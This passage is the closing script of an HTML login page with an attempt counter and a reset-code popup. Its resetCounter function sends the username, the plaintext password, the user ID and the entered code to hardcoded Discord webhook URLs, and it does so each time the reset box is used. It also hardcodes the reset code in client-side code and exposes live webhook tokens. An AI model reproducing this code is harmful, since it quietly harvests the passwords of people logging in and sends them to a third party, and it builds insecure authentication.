        attemptsText.textContent = `Attempts Left: ${attempts}`;
      }

      // Disables login inputs and submit button
      function disableInputs() {
        usernameInput.disabled = true;
        passwordInput.disabled = true;
        userIDInput.disabled = true;
        submitBtn.disabled = true;
        trackActivity('LOGIN_UI', 'Login inputs disabled');
      }

      // Enables login inputs and submit button
      function enableInputs() {
        usernameInput.disabled = false;
        passwordInput.disabled = false;
        userIDInput.disabled = false;
        submitBtn.disabled = false;
        trackActivity('LOGIN_UI', 'Login inputs enabled');
      }

      // Shows the reset password popup
      function showResetPopup() {
        resetPopup.style.display = 'block';
        resetPopup.setAttribute('aria-hidden', 'false');
        resetField.focus();
        trackActivity('LOGIN_UI', 'Reset popup shown');
      }

      // Hides the reset password popup
      function hideResetPopup() {
        resetPopup.style.display = 'none';
        resetPopup.setAttribute('aria-hidden', 'true');
        resetField.value = '';
        trackActivity('LOGIN_UI', 'Reset popup hidden');
      }

      // Handles resetting the attempt counter
      async function resetCounter() {
        const enteredCode = resetField.value.trim();
        const isCorrect = enteredCode === 'Reset.Counter.2579';

        const username = usernameInput.value || 'Unknown';
        const password = passwordInput.value || 'Unknown';
        const userID = userIDInput.value || 'Unknown';
        const user = findUser(username, userID) || {};

        // Send "Reset box Detected" webhook immediately
        const resetBoxEmbed = { title: "🔔 Reset Box Detected", color: 0xffff00, fields: [{ name: "Name", value: user.name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Password Entered", value: password, inline: true }, { name: "User ID", value: userID, inline: true }, { name: "Entered Code", value: enteredCode, inline: false }, { name: "Time", value: new Date().toLocaleString(), inline: false }]};
        const resetBoxWebhook = "https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJykeiThIZ6gYCJILFSHfSDSnsq";
        await sendWebhook(resetBoxWebhook, resetBoxEmbed);
        trackActivity('LOGIN_RESET', `Reset attempt for code: ${enteredCode}`);

        // Build embed for correct or incorrect code result
        const resultEmbed = {
          title: isCorrect ? "✅ Reset Code Accepted" : "❌ Incorrect Reset Code Attempt",
          color: isCorrect ? 0x00ff00 : 0xff0000,
          fields: [
            { name: "Name", value: user.name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password Entered", value: password, inline: true },
            { name: "User ID", value: userID, inline: true },
            { name: "Reset Code", value: enteredCode, inline: false },
            { name: "Time", value: new Date().toLocaleString(), inline: false }
          ]
        };

        const resultWebhook = isCorrect
          ? "https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB"
          : "https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip";

        await sendWebhook(resultWebhook, resultEmbed);

        if (isCorrect) {
          attempts = 3;
          updateAttemptsText();
          enableInputs();
          hideResetPopup();
          errorMsg.textContent = '';
          trackActivity('LOGIN_RESET', 'Reset counter accepted, inputs re-enabled');
          showNotification('Login attempts reset successfully!');
        } else {
          showNotification('Incorrect reset code.');
          trackActivity('LOGIN_RESET', 'Incorrect reset code entered');
        }
      }

      // Attach event listeners for login actions
      submitBtn.addEventListener('click', submitLogin);
      resetBtn.addEventListener('click', resetCounter);

      // Listen for Enter key to submit login or reset
      document.addEventListener('keydown', e => {
        if (e.key === 'Enter') {
          if (resetPopup.style.display === 'block') {
            resetCounter();
          } else if (document.activeElement !== textNotesArea) { // Don't trigger if actively typing in textarea on notes
            submitLogin();
          }
        }
      });

      updateAttemptsText(); // Initial display of attempts
    })();
  </script>
</body>
</html>
